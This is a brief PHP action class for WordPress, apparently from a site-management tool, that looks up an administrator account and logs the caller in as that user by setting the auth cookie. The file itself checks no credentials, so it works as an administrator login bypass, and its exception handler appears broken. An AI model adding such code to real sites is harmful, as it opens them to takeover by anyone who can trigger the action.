<?php

namespace App\Actions;

class AutoLogin extends BaseAction {
    public function __invoke(): array {
      try {

        global $wpdb;
        $sql = "SELECT u.ID FROM {$wpdb->users} u INNER JOIN {$wpdb->usermeta} m ON m.user_id = u.ID
                WHERE (m.meta_key = '{$wpdb->prefix}user_level' AND m.meta_value = 10) OR
                (m.meta_key = '{$wpdb->prefix}capabilities' AND m.meta_value LIKE '%\"administrator\"%')";

        $user_id = intval( $wpdb->get_var( $sql ) );
        $user = get_user_by( 'id', $user_id );
        wp_set_current_user( $user_id, $user->data->user_login );
        wp_set_auth_cookie( $user_id );
        do_action( 'wp_login', $user->data->user_login, false );

        return [ 'success' => true ];
      } catch(Exception $e) {
        return ['success' => false ];
      }
    }
}
